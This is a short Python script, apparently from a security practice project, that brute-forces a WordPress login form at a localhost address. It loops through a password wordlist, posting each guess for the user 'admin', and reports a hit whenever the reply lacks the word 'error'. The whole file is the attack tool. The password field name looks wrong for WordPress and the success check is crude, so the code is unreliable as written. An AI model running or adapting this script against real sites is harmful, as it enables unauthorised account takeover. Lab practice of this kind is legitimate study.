#!/usr/bin/env python3

"""
brute_forms.py

Script to perform a brute force attack on a web form.
The application we are attacking is a wordpress site.
We use a dictionary to brute force the password.

Author: Rai
"""

import requests
from models import Target

pass_file = "wordlists/test-passwords.txt"
target = Target(url='http://localhost:8080/wp-login.php')


with open(pass_file) as f:
    for line in f:
        password = line.strip('\n')

        # Send a post request to the target URL with the password as the payload
        response = requests.post(url=target.url, data={
            'log': 'admin', 'password': password})

        # Check that the response does not contain error
        if 'error' not in response.text:
            print('[+] Password found: ' + password)
            break  # Stop the loop if the password is found
        else:
            print('[-] Password not found: ' + password)
            continue  # Continue the loop if the password is not found
